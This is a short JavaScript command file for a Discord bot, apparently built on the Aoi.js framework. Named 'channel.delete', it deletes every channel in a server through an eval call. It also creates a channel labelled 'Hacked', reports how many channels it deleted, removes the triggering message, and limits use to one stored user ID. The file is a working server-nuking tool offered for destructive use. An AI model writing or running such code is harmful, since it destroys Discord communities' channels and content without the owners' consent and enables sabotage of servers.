module.exports = {
  name:"channel.delete",
  code:`
  $createChannel[$guildid;Hacked $getVar[ghostt];Text;$channelID[$getVar[ghostt]]]
  $djsEval[message.guild.channels.cache.filter(channel => channel).map(channel => channel.delete(channel))]
  $sendMessage[
  $channelCount Channel Deleted :white_check_mark:
  Wait... ⌛;no]  
  $deletecommand
  $onlyforids[$getvar[id];]
  `
}
